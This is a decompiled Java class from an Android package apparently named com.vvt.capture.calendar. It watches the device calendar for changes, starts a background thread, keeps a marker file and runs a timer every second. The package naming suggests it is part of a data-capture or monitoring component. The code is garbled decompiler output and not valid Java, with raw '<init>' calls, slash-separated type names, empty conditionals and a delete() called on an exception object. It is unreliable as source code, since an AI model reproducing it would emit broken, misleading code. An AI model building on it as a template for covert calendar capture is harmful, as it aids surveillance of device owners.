package com.vvt.capture.calendar.d;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import com.vvt.capture.calendar.d;
import com.vvt.io.p;
import java.io.File;
import java.io.IOException;
import java.util.Timer;

public class a
  extends ContentObserver
  implements com.vvt.capture.calendar.c.a
{
  private static final boolean a = d.a;
  private static final boolean b = d.e;
  private com.vvt.capture.calendar.c.b c;
  private Timer d = null;
  private ContentResolver e;
  private boolean f = false;
  private String g;
  
  public a()
  {
    super(null);
  }
  
  private void a(boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    File localFile = new java/io/File;
    String str = e();
    localFile.<init>(str);
    if (paramBoolean)
    {
      boolean bool2 = localFile.exists();
      if (!bool2) {}
    }
    for (;;)
    {
      return;
      try
      {
        localFile.createNewFile();
      }
      catch (IOException localIOException)
      {
        bool1 = b;
      }
      if (bool1)
      {
        continue;
        localIOException.delete();
      }
    }
  }
  
  private boolean d()
  {
    File localFile = new java/io/File;
    String str = e();
    localFile.<init>(str);
    boolean bool1 = localFile.exists();
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private String e()
  {
    String str = p.a(this.g, "calendar");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      localFile.mkdirs();
    }
    return p.a(str, "coutdown");
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.e;
    if (localObject1 == null)
    {
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      bool = this.f;
      if (!bool)
      {
        localObject1 = this.e;
        Object localObject2 = com.vvt.capture.calendar.b.c.e();
        ((ContentResolver)localObject1).registerContentObserver((Uri)localObject2, false, this);
        localObject1 = new java/lang/Thread;
        localObject2 = new com/vvt/capture/calendar/d/b;
        ((b)localObject2).<init>(this);
        String str = "CalendarOnChangeT";
        ((Thread)localObject1).<init>((Runnable)localObject2, str);
        ((Thread)localObject1).start();
        bool = true;
        this.f = bool;
      }
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a(ContentResolver paramContentResolver)
  {
    this.e = paramContentResolver;
  }
  
  public void a(com.vvt.capture.calendar.c.b paramb)
  {
    this.c = paramb;
  }
  
  public void a(String paramString)
  {
    this.g = paramString;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    this.e.unregisterContentObserver(this);
    bool = false;
    this.c = null;
    Timer localTimer = this.d;
    if (localTimer != null)
    {
      localTimer = this.d;
      localTimer.cancel();
    }
    this.f = false;
    a(false);
    bool = a;
    if (bool) {}
  }
  
  public void onChange(boolean paramBoolean)
  {
    Timer localTimer = this.d;
    if (localTimer != null)
    {
      localTimer = this.d;
      localTimer.cancel();
      boolean bool = a;
      if (!bool) {}
    }
    a(true);
    localTimer = new java/util/Timer;
    localTimer.<init>();
    this.d = localTimer;
    localTimer = this.d;
    c localc = new com/vvt/capture/calendar/d/c;
    localc.<init>(this);
    localTimer.scheduleAtFixedRate(localc, 0L, 1000L);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calendar/d/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */